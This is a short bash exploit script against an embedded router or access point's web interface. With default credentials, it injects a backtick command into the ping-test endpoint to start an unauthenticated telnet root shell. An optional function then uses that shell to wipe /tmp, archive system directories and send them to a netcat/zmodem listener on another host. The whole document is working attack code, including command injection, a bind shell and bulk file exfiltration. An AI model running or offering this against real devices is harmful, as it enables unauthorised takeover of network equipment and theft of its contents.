#!/usr/bin/env bash
LOGIN="admin:admin"
AP="192.168.100.254"
CLIENT="192.168.100.100"
PORT=9099


popit() {
curl -s -X POST -H "Content-Type:" -d '`telnetd${IFS}-p${IFS}9001${IFS}-l${IFS}/bin/sh`' -u ${LOGIN} -m 3 --url "http://${AP}/goform/websPingTest";
}

exfil() {
cat > zmodem.sh << _EOF_
#!/usr/bin/env bash
rz -q -U
_EOF_
chmod +x zmodem.sh
nc -lvkp ${PORT} -e ./zmodem.sh&

sleep 3
cat > client.expect << _EOF_
spawn nc -t ${AP} 9001
expect "Busy" {send "rm -rf /tmp/*;for dir in bin sbin lib libexec usr var etc etc_ro; do cd / ; tar cf /tmp/\\\${dir}.tar /\\\${dir} ; lsz --tcp-client ${CLIENT}:${PORT} /tmp/\\\${dir}.tar ; rm /tmp/\\\${dir}.tar ; done\r"}
expect eof
close
_EOF_
cat client.expect
expect -d client.expect
rm client.expect
kill %1
rm zmodem.sh
}

popit
#sleep 1
#exfil
